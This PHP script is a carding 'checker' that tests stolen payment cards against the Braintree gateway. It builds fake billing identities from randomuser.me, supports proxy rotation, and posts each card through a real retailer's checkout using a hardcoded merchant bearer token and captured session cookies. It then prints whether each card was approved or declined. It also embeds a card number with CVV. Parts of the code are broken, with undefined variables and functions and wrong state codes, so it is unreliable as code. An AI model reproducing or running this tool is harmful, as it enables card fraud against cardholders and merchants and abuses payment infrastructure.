<?php 

//////////////////////[Raw Api for Braintree payment gateway  Edited by #skylar69]///////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}
$proxy = rebootproxy();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

///////////////////////////////////////////////////=========[Luminati Details]

$username = 'username';
$password = 'password';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

///////////////////////////////////////////////////=========[Authorizing Cards]

$ch = curl_init();

//////////======= Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"276aac21-a69a-4000-9bc3-dd4b716dbe42"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4737030030702574","expirationMonth":"01","expirationYear":"2024","cvv":"147","cardholderName":"NIce NAme","billingAddress":{"countryName":"United States","locality":"Santa Barbara","region":"California","firstName":"NIce","lastName":"NAme","postalCode":"93101-3840","streetAddress":"122 Los Aguajes Ave Apt 1"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MjMwOTMxMzksImp0aSI6IjJkNzNmY2UyLTk4ZTAtNGY1NC05YWUyLTMzNDVmNTEzZDIyNyIsInN1YiI6IjdqaHliOTl5emMzcGJyZ2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdqaHliOTl5emMzcGJyZ2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiTWlnaHR5TmVzdF9pbnN0YW50In19.voKWPxsexCtqNQ4kkcnvfIAv1PRlWUvRxYI4-8za6gylwq3eUG_A2o7w9-U2MS9GvF7RzPuKLZrGfRyBo_wa2Q';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));

///////////////////////////////////////////////////=========[Charging Cards]

$ch = curl_init();
//////////======= Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://mightynest.com/checkout/update/payment');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&_method=patch&authenticity_token=YMKT%2BD8l0Xp4%2Fk44w4wpLNvWdDtIJwjUW5C%2F%2FpKI4pDVA6lULgAW9r%2FisK8prJNwZ61A%2Fmru6UgMl0MHgeCI9w%3D%3D&order%5Bstate_lock_version%5D=4&order%5Bcoupon_code%5D=&use_existing_card=no&order%5Bpayments_attributes%5D%5B%5D%5Bpayment_method_id%5D=5&payment_source%5B5%5D%5Bname%5D=NIce+NAme&payment_source%5B5%5D%5Bpayment_method_nonce%5D=tokencc_bh_sxdpwq_mw2qhy_sm2wsn_cwhxty_v23&payment_source%5B5%5D%5Bencrypted_data%5D=1&order%5Buse_shipping%5D=1&order%5Bbill_address_attributes%5D%5Bid%5D=705362');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'authority: mightynest.com';
$headers[] = 'method: POST';
$headers[] = 'path: /checkout/update/payment';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'cookie: mightynest_uuid=2d28c12e-5357-4a59-9278-ed32d6b5f288; guest_token=BAhJIihqOWlaQWJ5SzVCLUVvVDFMV0FmOXpnMTYyMzAwNTQ3MTQ4NAY6BkVU--e0a367adf7d4fda00fd83b48fc7004683079c00d; cart_item_count=0; box_item_count=-1; _ga=GA1.2.1533115231.1623005476; _gid=GA1.2.636846353.1623005476; _fbp=fb.1.1623005477557.525649401; first_landing_page=https%3A//mightynest.com/; last_landing_page=https%3A//mightynest.com/; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2MjMwMDU0NzksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbWlnaHR5bmVzdC5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjIzMDA1NDg0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL21pZ2h0eW5lc3QuY29tLyJ9fQ==; SL_C_23361dd035530_KEY=b855d2678f43421098506c5fba485e5e0484a264; SL_C_23361dd035530_VID=O8NLkkH8Tb; SL_C_23361dd035530_SID=w6hL2vvyXYq; _mightyschools_session=VEhEQ3JSWTdoMXpDSjFxVHlrVE8yNC9IUWJ4clFxeHVDM3BtR2xtVEhqVENNVlJRTUowdVcrRlVnbDkxem9DUXBrWGRDY3RuSXUzMlh2Q1VSeGw0V0NEYjB4UGIzOGNETHJOQzhsR0xpbFBPWVJsVGY1SlhhcE9LcjFSWFRkUWU1ZlpEOVIwcjlvNEFjcDVXWk9sUGgzVGNWRG8zeXRaRVFpSWx1NmNJSXVvTURoR1lMNFhoMGN6K1R5bi9QeXBkbnN6R0V5V3hHNllicnl4UnJEeDBXQmUrZFZNaTNnUEJnTDRhWVloMExLaVA3amJtd2gycmpLbTRrUkp4Yko5WThIc2FMMGljODY0N0dGVjc2YnRmekV3QS9sbEtMU1Vkak1BdVIwaDRyZFQ0TnJCYVh4SWdZam5XWkpFaFJ2SVRDanY5RWlhenNGVXI2YVM0S2hvLzZtY3draExDNWJYdkc5NWhnSU1TZTJiUkVGVVBGZzJlMEJoeWZOckZuSUIwNVAwbllvUDRXNmZSRlhNZkQ5eEpoZz09LS1mOWJ4SlVJdUQvS3B1MXc4Zjgrb0dBPT0%3D--278078bca8fecb7fb848c155f868bcd36e2cfc56';
$headers[] = 'origin: https://mightynest.com';
$headers[] = 'referer: https://mightynest.com/checkout/payment';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$msg = trim(strip_tags(getStr2($response,'"message":"','"')));

///////////////////////////////////////////////////=========[Responses]

if (strpos($msg, '1000')) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [BRAINTREE CVV_] </span> </span>  <span class="text-succes">#Approved</span></span> <span class="text-success">   '.$msg.' </span></br>';
} 
elseif (strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV')) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [BRAINTREE CCN_] </span> </span>  <span class="text-succes">#Approved</span></span> <span class="text-success">   '.$msg.' </span></br>';
} 

elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Declined')) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[]  </span> </span> <span class="text-succes">#Approved</span></span></br>';
} 
elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Processor Declined')) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[Processor Declined]  </span> <span class="text-danger">#Declined</span></span> </span> <span class="text-danger"> '.$msg.' </span></br>';
} 
elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Declined')) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[]  </span> <span class="text-danger">#Declined</span></span> </span> <span class="text-danger"> '.$msg.' </span></br>';
}
else {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[BRAINTREE] []  </span> <span class="text-danger">#Declined</span></span> </span> <span class="text-danger"> '.$msg.' </span></br>';
}
curl_close($ch);

ob_flush();

///////////////////////////////////Edited and modified by Skylar69////////////////////////

?>
